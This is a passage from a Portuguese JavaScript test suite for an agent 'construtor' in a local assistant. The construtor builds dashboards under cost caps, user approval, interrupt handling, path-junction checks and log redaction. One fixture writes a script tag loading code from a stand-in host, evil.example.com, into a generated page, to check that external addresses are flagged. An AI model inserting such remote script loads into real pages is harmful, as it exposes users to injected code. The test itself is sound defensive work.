  ok(fimA?.custo_usd === 0.0335 && fimA?.teto_usd === 0.4, 'fim: o custo do result (US$ 0,0335) e o teto');
  ok(pasta.abertos.length === pastaAntes + 1 && /index\.html$/.test(pasta.abertos.at(-1).abs) && pasta.abertos.at(-1).o?.pagina === true, 'fim: a prévia (index.html) abriu no navegador padrão (abrirNoWindows com pagina: true)');
  ok(/data-jarvis="trava"/.test(fs.readFileSync(path.join(projAReal, 'index.html'), 'utf8')), 'fim: o index.html levou a trava do Jarvis (CSP sem rede) antes de abrir');
  ok(/^data:image\/jpeg;base64,/.test(fimA?.print?.miniatura || '') && fimA?.print?.id && pasta.porId(fimA.print.id), 'fim: print com miniatura e id (gravado em Prints)');
  ok(fs.readdirSync(path.join(raizJarvis, 'Prints')).some(n => /vendas-por-filial \(prévia\)\.jpg$/.test(n)), 'fim: o print está em JARVIS\\Prints');
  ok(fimA?.index_id && fimA?.pasta_id && !fimA?.avisos, 'fim: ids do index.html e da pasta, sem avisos');
  ok(fimA?.arquivos.map(a => a.nome).sort().join(',') === 'dados.js,index.html', `fim: arquivos ${fimA?.arquivos.map(a => a.nome).join(', ')}`);
  const evA = A.ev.filter(x => x.e === 'construcao');
  const estadosA = evA.map(x => x.d.estado);
  ok(estadosA[0] === 'preparando' && estadosA.includes('construindo') && estadosA.includes('conferindo') && estadosA.at(-1) === 'pronto', `eventos na ordem: ${[...new Set(estadosA)].join(' → ')}`);
  ok(A.ev.every(x => x.aba === 'aba-A'), 'eventos só na aba que aprovou');
  const CHAVES = ['id', 'projeto', 'tipo', 'estado', 'etapa', 'arquivos', 'custo_usd', 'teto_usd', 'segundos'];
  ok(evA.every(x => CHAVES.every(c => c in x.d)), 'evento construcao com id, projeto, tipo, estado, etapa, arquivos, custo_usd, teto_usd, segundos');
  ok(evA.some(x => x.d.etapa === 'Montando a tabela'), 'a etapa do andamento do modelo chegou no evento');
  const durA = Math.max(1, (evA.at(-1).t - evA[0].t) / 1000);
  ok(evA.length <= Math.ceil(durA * 4) + 8, `no máximo ~4 eventos por segundo (${evA.length} em ${durA.toFixed(1)} s)`);
  const falaA = A.ev.find(x => x.e === 'falar');
  ok(falaA && /^Pronto\./.test(falaA.d.texto) && /centavos de dólar/.test(falaA.d.texto) && !/[\\/]/.test(falaA.d.texto) && /vendas por filial/.test(falaA.d.texto), `fala do fim, sem caminho e sem hífen: "${falaA?.d.texto}"`);
  ok(fimA?.fala === falaA?.d.texto, 'a fala do fim também fica no estado (a tela que reabrir depois diz ela)');
  ok(A.av.length === 1 && A.av[0].aba === 'aba-A' && /terminou/.test(A.av[0].t) && /pronto/.test(A.av[0].t), 'aviso para a próxima fala do Jarvis, na aba certa');
  const gA = JSON.parse(fs.readFileSync(path.join(base, 'gastos', 'gastos-1.json'), 'utf8'));
  ok(gA.dia === hojeSP && gA.gasto_usd === 0.0335 && gA.construcoes.length === 1 && !JSON.stringify(gA).includes('Segredo'), 'gastos.json: o dia, o gasto e o histórico (sem o pedido)');
  ok(gA.construcoes[0].estado === 'pronto' && gA.construcoes[0].contado_usd === 0.0335 && gA.construcoes[0].fim, 'gastos.json: a entrada da construção acertada no fim (estado, contado, fim)');

  /* ---------------------------------------------------------------- desfechos */
  titulo('desfechos: teto, passos, erro, gerador que lança');
  const B = novoK(async function* ({ escrever }) {
    yield { type: 'system', subtype: 'init' };
    await escrever('a.html', '<p>a</p>');
    yield usuario();
    yield resultado('error_max_budget_usd', { total_cost_usd: 0.33 });
    throw new Error('Claude Code returned an error result: Reached maximum budget ($0.32)');
  });
  const fimB = await esperarFim(B.k, (await construirCom(B.k, { nome: 'teto sdk' })).r.id);
  ok(fimB?.estado === 'teto' && /teto de custo/.test(fimB.mensagem) && fimB.custo_usd === 0.33, `error_max_budget_usd (e o gerador lançando depois) → teto: ${fimB?.mensagem}`);
  ok(pasta.abertos.length === pastaAntes + 1, 'no teto, a prévia não abre');
  const C = novoK(async function* () { yield { type: 'system', subtype: 'init' }; yield resultado('error_max_turns'); throw new Error('max turns'); });
  const fimC = await esperarFim(C.k, (await construirCom(C.k, { nome: 'passos' })).r.id);
  ok(fimC?.estado === 'parado' && /número de passos/.test(fimC.mensagem), `error_max_turns → parado: ${fimC?.mensagem}`);
  const D = novoK(async function* () { yield { type: 'system', subtype: 'init' }; throw new Error('o processo caiu'); });
  const fimD = await esperarFim(D.k, (await construirCom(D.k, { nome: 'caiu' })).r.id);
  ok(fimD?.estado === 'erro' && /falhou/.test(fimD.mensagem), `gerador lança sem result → erro: ${fimD?.mensagem}`);
  ok(logs.some(l => /construtor: falhou caiu/.test(l)), 'o erro vai para o log (só o projeto e o motivo)');
  const E = novoK(async function* () { yield { type: 'system', subtype: 'init' }; yield resultado('success', { is_error: true, result: 'API Error: 529 overloaded' }); });
  const fimE = await esperarFim(E.k, (await construirCom(E.k, { nome: 'api erro' })).r.id);
  ok(fimE?.estado === 'erro', 'success com is_error (erro da API) → erro');
  ok(/A construção falhou: a API do Claude está ocupada/.test(fimE?.mensagem || '') && /ocupada/.test(fimE?.fala || ''), `o porquê numa frase curta, na tela e na voz: "${fimE?.mensagem}"`);
  ok(!fs.existsSync(path.join(raizJarvis, 'Projetos', 'caiu')) && /Nada ficou na pasta/.test(fimD?.mensagem || '') && !fimD?.pasta_id, 'projeto novo que falhou sem escrever nada: a pasta vazia saiu');
  ok((await D.k.preparar({ tipo: 'bi', nome: 'caiu', pedido: PEDIDO, tamanho: 'pequeno' })).novo === true, 'pedir de novo com o mesmo nome: é um projeto novo (não vira "alterar" de uma pasta vazia)');
  ok(fs.existsSync(path.join(raizJarvis, 'Projetos', 'teto-sdk', 'a.html')) && /Projetos\\teto-sdk/.test(fimB?.mensagem || '') && !/[\\/]/.test(fimB?.fala || '/') && /dólar|centavos/.test(fimB?.fala || ''), `o que escreveu fica, e a fala do teto vem sem caminho: "${fimB?.fala}"`);

  /* ---------------------------------------------------------------- parar */
  titulo('parar: interrupt() e depois close()');
  const F = novoK(async function* ({ st }) {
    yield { type: 'system', subtype: 'init' };
    while (!st.interrompido && !st.fechado) await pausa(20);
    yield resultado('error_during_execution');
    throw new Error('Claude Code returned an error result: interrompido');
  });
  const { r: rF } = await construirCom(F.k, { nome: 'parar cooperativo', aba: 'aba-F' });
  ok(await esperarEstado(F.k, 'construindo'), 'a construção ligou (construindo)');
  await recusaAsync(() => F.k.preparar({ tipo: 'site', nome: 'outro site', pedido: PEDIDO, tamanho: 'pequeno' }), /construtor-ocupado/, 'uma por vez: preparar com outra rodando');
  await recusaAsync(() => F.k.iniciar({ projeto: 'outro', tipo: 'site', pedido: PEDIDO, teto_usd: 0.4, tamanho: 'pequeno', novo: true }), /construtor-ocupado/, 'uma por vez: iniciar com outra rodando');
  const t0F = Date.now();
  const pF = await F.k.parar('pedido');
  const fimF = await esperarFim(F.k, rF.id);
  const ordemF = F.falso.chamadas[0].st.ordem;
  ok(pF.ok && /Parei/.test(pF.mensagem), `parar(): ${pF.mensagem}`);
  ok(ordemF[0] === 'interrupt' && ordemF.includes('close'), `ordem: ${ordemF.join(' → ')} (interrupt primeiro; close sempre no fim)`);
  ok(fimF?.estado === 'parado' && /como pedido/.test(fimF.mensagem) && Date.now() - t0F < 3000, `parado em ${Date.now() - t0F} ms: ${fimF?.mensagem}`);
  ok((await F.k.parar()).ok === false, 'parar sem nada rodando: "Nenhuma construção está rodando agora."');

  const G = novoK(async function* ({ st }) {
    yield { type: 'system', subtype: 'init' };
    while (!st.fechado) await pausa(20);   // ignora o interrupt: só o close termina
  }, { prazos: { fecharMs: 300, interromperMs: 100 } });
  const { r: rG } = await construirCom(G.k, { nome: 'parar teimoso' });
  await esperarEstado(G.k, 'construindo');
  const t0G = Date.now();
  await G.k.parar('pedido');
  const fimG = await esperarFim(G.k, rG.id);
  const ordemG = G.falso.chamadas[0].st.ordem;
  ok(ordemG[0] === 'interrupt' && ordemG[1] === 'close' && fimG?.estado === 'parado', `o gerador não terminou com o interrupt: close() depois do prazo (${ordemG.join(' → ')}, ${Date.now() - t0G} ms)`);

  const H = novoK(async function* ({ escrever, st }) {
    yield { type: 'system', subtype: 'init' };
    yield assistente('caro', [{ type: 'tool_use', name: 'Write', input: { file_path: 'a.html' } }], { output_tokens: 40000 });   // US$ 0,40 ao vivo
    st.escreveu = await escrever('caro.html', '<p>x</p>');
    while (!st.interrompido && !st.fechado) await pausa(20);
    yield resultado('error_during_execution', { total_cost_usd: 0.41 });
    throw new Error('interrompido');
  });
  const { r: rH } = await construirCom(H.k, { nome: 'teto suave' });
  const fimH = await esperarFim(H.k, rH.id);
  ok(H.falso.chamadas[0].st.escreveu === false && !fs.existsSync(path.join(raizJarvis, 'Projetos', 'teto-suave', 'caro.html')), 'teto suave: com o gasto ao vivo em 90% do teto, o Write foi negado');
  ok(fimH?.estado === 'teto' && H.falso.chamadas[0].st.ordem[0] === 'interrupt', `teto suave: parou sozinho (interrupt) → ${fimH?.estado}`);

  const I = novoK(async function* ({ st }) {
    yield { type: 'system', subtype: 'init' };
    while (!st.interrompido && !st.fechado) await pausa(20);
    yield resultado('error_during_execution');
  }, { prazos: { tempoMs: 300 } });
  const fimI = await esperarFim(I.k, (await construirCom(I.k, { nome: 'tempo' })).r.id);
  ok(fimI?.estado === 'parado' && /tempo máximo/.test(fimI.mensagem), `tempo máximo → parado: ${fimI?.mensagem}`);

  const J = novoK(async function* ({ escrever }) {
    yield { type: 'system', subtype: 'init' };
    await escrever('index.html', '<script src="https://evil.example.com/x.js"></script>');
    yield resultado('success', { is_error: false, total_cost_usd: 0.05 });
  });
  const abertosJ = pasta.abertos.length;
  const fimJ = await esperarFim(J.k, (await construirCom(J.k, { nome: 'conferencia' })).r.id);
  ok(fimJ?.estado === 'pronto' && fimJ.avisos?.length && /endereços de fora/.test(fimJ.mensagem) && pasta.abertos.length === abertosJ, `conferência achou endereço de fora: pronto, mas não abriu sozinho (${fimJ?.avisos?.[0]})`);

  const R = novoK(async function* ({ st }) {
    yield { type: 'system', subtype: 'init' };
    while (!st.interrompido && !st.fechado) await pausa(20);
    yield resultado('error_during_execution');
  });
  const { r: rR } = await construirCom(R.k, { nome: 'desligar', aba: 'aba-R' });
  await esperarEstado(R.k, 'construindo');
  await R.k.desligar();
  const fimR = R.k.estado().ultimas[0];
  ok(fimR?.id === rR.id && fimR.estado === 'parado' && /app fechou/.test(fimR.mensagem) && !R.ev.some(x => x.e === 'falar'), 'desligar(): para a que roda, sem fala');

  /* ---------------------------------------------------------------- preparar: as recusas */
  titulo('preparar: teto do dia, pasta, chave');
  const K = novoK(async function* () { yield resultado('success', { is_error: false }); });
  const arqG = path.join(base, 'gastos', `gastos-${nG}.json`);
  await fsp.writeFile(arqG, JSON.stringify({ dia: hojeSP, gasto_usd: 9.95, construcoes: [] }));
  await recusaAsync(() => K.k.preparar({ tipo: 'bi', nome: 'novo bi', pedido: PEDIDO, tamanho: 'pequeno' }), /construtor-teto-dia/, 'teto do dia (US$ 9,95 de 10)');
  await fsp.writeFile(arqG, JSON.stringify({ dia: hojeSP, gasto_usd: 9.7, construcoes: [] }));
  const pK = await K.k.preparar({ tipo: 'bi', nome: 'novo bi', pedido: PEDIDO, tamanho: 'pequeno' });
  ok(pK.teto_usd === 0.3 && pK.resta_hoje_usd === 0.3, `resta US$ 0,30 hoje: o teto cai para ${pK.teto_usd}`);
  await fsp.writeFile(arqG, JSON.stringify({ dia: '2000-01-01', gasto_usd: 9.99, construcoes: [] }));
  ok((await K.k.preparar({ tipo: 'bi', nome: 'novo bi', pedido: PEDIDO, tamanho: 'pequeno' })).teto_usd === 0.4, 'gasto de outro dia não conta');
  await recusaAsync(() => K.k.preparar({ tipo: 'bi', nome: 'nao existe', pedido: PEDIDO, tamanho: 'pequeno', alterar: true }), /construtor-sem-projeto/, 'alterar um projeto que não existe');
  await recusaAsync(() => K.k.preparar({ tipo: 'bi', nome: 'vendas por filial', pedido: PEDIDO, tamanho: 'pequeno' }), /construtor-existe/, 'projeto novo com nome que já existe');
  const pAlt = await K.k.preparar({ tipo: 'bi', nome: 'vendas por filial', pedido: PEDIDO, tamanho: 'medio', alterar: true });
  ok(pAlt.novo === false && pAlt.estimativa_usd === 0.23, 'alterar o que existe: novo false, estimativa × 0,7');
  await recusaAsync(() => K.k.preparar({ tipo: 'planilha', nome: 'x y', pedido: PEDIDO, tamanho: 'pequeno' }), /construtor-tipo/, 'tipo inválido');
  await recusaAsync(() => K.k.preparar({ tipo: 'bi', nome: 'curto', pedido: 'faz um bi', tamanho: 'pequeno' }), /construtor-pedido/, 'pedido curto demais');
  await fsp.writeFile(path.join(raizJarvis, 'Projetos', 'um-arquivo'), 'x');
  await recusaAsync(() => K.k.preparar({ tipo: 'bi', nome: 'um arquivo', pedido: PEDIDO, tamanho: 'pequeno', alterar: true }), /construtor-pasta/, '"projeto" que é um arquivo');
  if (temJuncao) {
    try {
      execFileSync('cmd', ['/c', 'mklink', '/J', path.join(raizJarvis, 'Projetos', 'juncao'), fora], { stdio: 'ignore', windowsHide: true });
      await recusaAsync(() => K.k.preparar({ tipo: 'bi', nome: 'juncao', pedido: PEDIDO, tamanho: 'pequeno', alterar: true }), /construtor-pasta/, 'projeto que é uma junção para fora');
      fs.rmdirSync(path.join(raizJarvis, 'Projetos', 'juncao'));
    } catch (_) { /* sem mklink */ }
  }
  const semChave = criarConstrutor({ cfg: {}, pasta, gastosArquivo: path.join(base, 'gastos', 'sem-chave.json'), configDir: path.join(base, 'config-claude') });
  await recusaAsync(() => semChave.preparar({ tipo: 'bi', nome: 'sem chave', pedido: PEDIDO, tamanho: 'pequeno' }), /construtor-sem-chave/, 'sem a chave do Claude (e sem query de mentira)');
  const semPasta = criarConstrutor({ cfg: {}, query: queryDeMentira, gastosArquivo: path.join(base, 'gastos', 'sem-pasta.json'), configDir: path.join(base, 'config-claude') });
  await recusaAsync(() => semPasta.preparar({ tipo: 'bi', nome: 'sem pasta', pedido: PEDIDO, tamanho: 'pequeno' }), /construtor-sem-pasta/, 'sem a pasta do Jarvis');

  /* ---------------------------------------------------------------- as ferramentas do Jarvis + a ação pendente */
  titulo('ferramentas do Jarvis: construir vira ação pendente; só o "aprovado" começa');
  const L = novoK(async function* ({ escrever }) {
    yield { type: 'system', subtype: 'init' };
    await escrever('index.html', HTML_OK);
    yield resultado('success', { is_error: false, total_cost_usd: 0.03 });
  });
  const turno = [];
  const ctxL = { construtor: L.k, aba: 'aba-L', emitir: (e, d) => turno.push({ e, d }), signal: new AbortController().signal };
  ok(validar(construir.schema, { tipo: 'bi', nome: 'x', pedido: PEDIDO, tamanho: 'pequeno' }).length > 0, 'schema: nome de 1 letra é inválido');
  ok(validar(construir.schema, { tipo: 'bi', nome: 'painel ruptura', pedido: PEDIDO, tamanho: 'pequeno', extra: 1 }).length > 0, 'schema: campo a mais é inválido');
  const inv = await executarFerramenta(construir, { tipo: 'bi', nome: 'painel ruptura', pedido: 'curto', tamanho: 'pequeno' }, ctxL);
  ok(!inv.ok && /curto demais/.test(inv.texto), 'executarFerramenta recusa o pedido curto pelo schema');
  const r1 = await executarFerramenta(construir, { tipo: 'bi', nome: 'Painel ruptura', pedido: PEDIDO, tamanho: 'pequeno' }, ctxL);
  const c1 = JSON.parse(r1.texto);
  const ac1 = turno.find(x => x.e === 'acao')?.d;
  ok(r1.ok && c1.situacao === 'aguardando_aprovacao' && c1.estimativa_usd === 0.13 && c1.teto_usd === 0.4, `construir devolve "aguardando_aprovacao" com ~US$ ${c1.estimativa_usd} e teto ${c1.teto_usd}`);
  ok(ac1 && ac1.tipo === 'construir' && ac1.id === c1.acao_id && ac1.detalhe.modelo === 'Claude Sonnet 5.5' && ac1.detalhe.estimativa_usd === 0.13 && ac1.detalhe.teto_usd === 0.4 && ac1.detalhe.resta_hoje_usd === 10 && ac1.detalhe.novo === true && ac1.detalhe.projeto === 'painel-ruptura',
    'evento acao do tipo construir, com projeto, estimativa, teto, resta hoje, modelo e novo');
  ok(!L.k.estado().ativa && !fs.existsSync(path.join(raizJarvis, 'Projetos', 'painel-ruptura')), 'antes da aprovação nada começou e a pasta não existe');
  const rec = await decidir(c1.acao_id, 'recusar');
  ok(rec.ok && !L.k.estado().ativa && !fs.existsSync(path.join(raizJarvis, 'Projetos', 'painel-ruptura')), 'recusado: nada começou');
  ok(tirarAvisos('aba-L').some(t => /recusou/.test(t)), 'o Jarvis fica sabendo que foi recusado');   // o aviso diz "recusou"/"aprovou" desde a integração
  turno.length = 0;
  const r2 = JSON.parse((await executarFerramenta(construir, { tipo: 'bi', nome: 'Painel ruptura', pedido: PEDIDO, tamanho: 'pequeno' }, ctxL)).texto);
  const apr = await decidir(r2.acao_id, 'confirmar');
  ok(apr.ok && apr.status === 200 && /Comecei a construção de painel-ruptura/.test(apr.mensagem), `aprovado: ${apr.mensagem}`);
  ok(tirarAvisos('aba-L').some(t => /aprovou/.test(t)), 'o Jarvis fica sabendo que foi aprovado');
  const ver = JSON.parse((await executarFerramenta(verConstrucao, {}, ctxL)).texto);
  ok(ver.rodando?.projeto === 'painel-ruptura' || ver.ultimas?.[0]?.projeto === 'painel-ruptura', 'ver_construcao mostra a construção');
  const fimL = await esperarFim(L.k, L.k.estado().ativa?.id || L.k.estado().ultimas[0]?.id);
  ok(fimL?.estado === 'pronto', `a construção aprovada terminou: ${fimL?.mensagem}`);
  const par = await executarFerramenta(pararConstrucao, {}, ctxL);
  ok(!par.ok && /Nenhuma construção/.test(par.texto), 'parar_construcao sem nada rodando: erro que o modelo lê');
  turno.length = 0;
  const lis = JSON.parse((await executarFerramenta(listarProjetos, {}, ctxL)).texto);
  const cartaoPasta = turno.find(x => x.e === 'cartao')?.d;
  ok(lis.total >= 4 && lis.projetos.some(p => p.projeto === 'painel-ruptura' && p.tem_index), `listar_projetos: ${lis.total} projetos, painel-ruptura com index`);
  ok(cartaoPasta?.tipo === 'pasta' && cartaoPasta.dados.itens.length <= 12 && cartaoPasta.dados.itens.every(i => i.id), 'cartão pasta com até 12 itens e ids');
  const semK = await executarFerramenta(construir, { tipo: 'bi', nome: 'painel x', pedido: PEDIDO, tamanho: 'pequeno' }, { emitir: () => {}, aba: 'x' });
  ok(!semK.ok && /não está ligado/.test(semK.texto), 'sem o construtor no ctx: erro claro');
  // aprovado, mas a pasta apareceu no meio: não começa e diz por quê
  turno.length = 0;
  const r3 = JSON.parse((await executarFerramenta(construir, { tipo: 'site', nome: 'Site corrida', pedido: PEDIDO, tamanho: 'pequeno' }, ctxL)).texto);
  await fsp.mkdir(path.join(raizJarvis, 'Projetos', 'site-corrida'));
  const apr3 = await decidir(r3.acao_id, 'confirmar');
  ok(!apr3.ok && /alguém criou/.test(apr3.mensagem) && !L.k.estado().ativa, `aprovado com a pasta criada no meio: não começou (${apr3.mensagem})`);
  tirarAvisos('aba-L');

  /* ---------------------------------------------------------------- o query de mentira do --simulado */
  titulo('o query de mentira do --simulado');
  const evS = [];
  const S = criarConstrutor({ cfg: {}, pasta, banco: bancoFalso, vault, query: queryDeMentira, emitir: (a, e, d) => evS.push({ e, d }), log: () => {},
    gastosArquivo: path.join(base, 'gastos', 'simulado.json'), configDir: path.join(base, 'config-claude') });
  const { r: rS } = await construirCom(S, { nome: 'simulado' });
  const fimS = await esperarFim(S, rS.id);
  const htmlS = fs.readFileSync(path.join(raizJarvis, 'Projetos', 'simulado', 'index.html'), 'utf8');
  ok(fimS?.estado === 'pronto' && /SIMULADO/.test(htmlS) && fimS.custo_usd === 0, 'sem chave e sem gasto: escreveu o index.html de exemplo e terminou pronto');
  ok(evS.some(x => x.e === 'construcao' && /simulado/.test(x.d.etapa)), 'o andamento simulado chegou no evento');

  /* ---------------------------------------------------------------- nada fora da pasta temporária */
  titulo('nada fora da pasta temporária; log sem segredo');
  ok(fs.existsSync(CONFIG_PADRAO) === existiaConfig && fs.existsSync(GASTOS_PADRAO) === existiaGastos, 'o LOCALAPPDATA não foi tocado (configuração e gastos ficaram na pasta temporária)');
  ok(!logs.some(l => /Segredo123|chave-de-teste|Um BI de vendas por filial/.test(l)), 'o log não tem o pedido nem a chave');
  ok(baseReal.length > 0, `pasta temporária: ${baseReal}`);

  /* ---------------------------------------------------------------- de verdade (só com TESTE_CONSTRUTOR_REAL=1) */
  if (process.env.TESTE_CONSTRUTOR_REAL === '1') {
    titulo('DE VERDADE: um mini BI com o Claude Sonnet 5.5 (teto US$ 0,20)');
    // devolve o ambiente do processo (o construtor não herda nada mesmo; aqui é só para não atrapalhar o config.js)
    for (const [k, v] of Object.entries(ENV_ANTES)) { if (v == null) delete process.env[k]; else process.env[k] = v; }
    const { carregarConfig } = await import('../config.js');
    const cfgReal = carregarConfig([]);
    if (!cfgReal.anthropic.apiKey) ok(false, 'sem ANTHROPIC_API_KEY no ENV: o teste real não roda');
    else {
      let nav = null;
      const perfilNav = path.join(base, 'navegador-perfil');
      try {
        const { criarNavegador } = await import('../navegador.js');
        nav = criarNavegador({ perfil: perfilNav, projetosDir: path.join(raizJarvis, 'Projetos'), log: () => {} });
        if (typeof nav?.printArquivo !== 'function') nav = null;
      } catch (_) { nav = null; }
      console.log(nav ? '(prévia pelo navegador da parte B)' : '(sem o navegador da parte B: a prévia volta como texto)');
      const evR = [], avR = [], logR = [];
      const RK = criarConstrutor({
        cfg: { anthropic: { apiKey: cfgReal.anthropic.apiKey } }, pasta, banco: bancoFalso, vault, navegador: nav,
        emitir: (a, e, d) => evR.push({ e, d: structuredClone(d) }), avisar: (a, t) => avR.push(t), log: (...a) => logR.push(a.join(' ')),
        gastosArquivo: path.join(base, 'gastos', 'real.json'), configDir: path.join(base, 'config-claude-real'),
      });
      const t0 = Date.now();
      const { r: rReal } = await construirCom(RK, {
        nome: 'mini bi real', teto: 0.2,
        pedido: 'Mini BI de vendas por filial. Pegue os dados com mcp__lube__consultar_dados (select filial, venda from comercial.venda_filial) e grave num dados.js. Um cartão com o total, uma tabela e um gráfico de barras com Chart.js 4.4.1 do cdnjs. No máximo 4 arquivos curtos. Chame mcp__lube__andamento a cada etapa.',
      });
      const fimReal = await esperarFim(RK, rReal.id, 6 * 60000);
      const projR = path.join(raizJarvis, 'Projetos', 'mini-bi-real');
      console.log(`   estado ${fimReal?.estado} · ${fimReal?.mensagem} · ${((Date.now() - t0) / 1000).toFixed(1)} s · etapas: ${[...new Set(evR.filter(x => x.e === 'construcao').map(x => x.d.etapa))].join(' | ')}`);
      ok(fimReal?.estado === 'pronto', 'a construção de verdade terminou pronta');
      ok(fimReal && fimReal.custo_usd > 0 && fimReal.custo_usd <= 0.2, `custo dentro do teto: ${fimReal?.custo_usd} (teto 0,20)`);
      ok(fs.existsSync(path.join(projR, 'index.html')) && fs.existsSync(path.join(projR, 'dados.js')), `index.html e dados.js escritos (${fimReal?.arquivos.map(a => a.nome).join(', ')})`);
      ok(bancoFalso.consultas.length >= 2, 'o construtor consultou os dados pela ferramenta própria');
      ok(evR.some(x => x.e === 'construcao' && x.d.estado === 'construindo'), 'andamento chegou durante a construção');
      ok(!fs.existsSync(path.join(base, 'fora', 'fora.html')), 'nada fora da pasta do projeto');
      await pausa(1500);
      let vivos = -1;
      try {
        vivos = Number(execFileSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command',
          "@(Get-CimInstance Win32_Process -Filter \"Name='claude.exe'\" | Where-Object { $_.ExecutablePath -and $_.ExecutablePath.ToLower().StartsWith($env:CEREBRO_SDK_DIR.ToLower()) }).Count"],
        { encoding: 'utf8', windowsHide: true, timeout: 30000, env: { ...process.env, CEREBRO_SDK_DIR: path.join(fs.realpathSync.native(SERVIDOR), 'node_modules') } }).trim());
      } catch (_) { vivos = -1; }
      ok(vivos === 0, `claude.exe do construtor vivos depois do fim: ${vivos}`);
      if (nav) {
        try { await nav.desligar(); } catch (_) { /* nada */ }
        try {
          execFileSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command',
            "Get-CimInstance Win32_Process -Filter \"Name='chrome.exe'\" | Where-Object { $_.CommandLine -like ('*' + $env:CEREBRO_PERFIL + '*') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"],
          { windowsHide: true, timeout: 30000, env: { ...process.env, CEREBRO_PERFIL: perfilNav } });
        } catch (_) { /* nada */ }
      }
      ok(!logR.some(l => /sk-ant|Mini BI de vendas/.test(l)), 'log do teste real sem a chave e sem o pedido');
    }
  } else {
    console.log('\n(o teste de verdade só roda com TESTE_CONSTRUTOR_REAL=1; custa por volta de US$ 0,03, teto US$ 0,20)');
  }
} finally {
  for (const [k, v] of Object.entries(ENV_ANTES)) { if (v == null) delete process.env[k]; else process.env[k] = v; }
  try { vault.parar(); } catch (_) { /* nada */ }
  try { await fsp.rm(base, { recursive: true, force: true, maxRetries: 3 }); } catch (e) { console.log('(não consegui apagar a pasta temporária:', e?.code, ')'); }
}

console.log(`\n${total - falhas} de ${total} OK${falhas ? ` — ${falhas} FALHARAM` : ''}`);
process.exit(falhas ? 1 : 0);
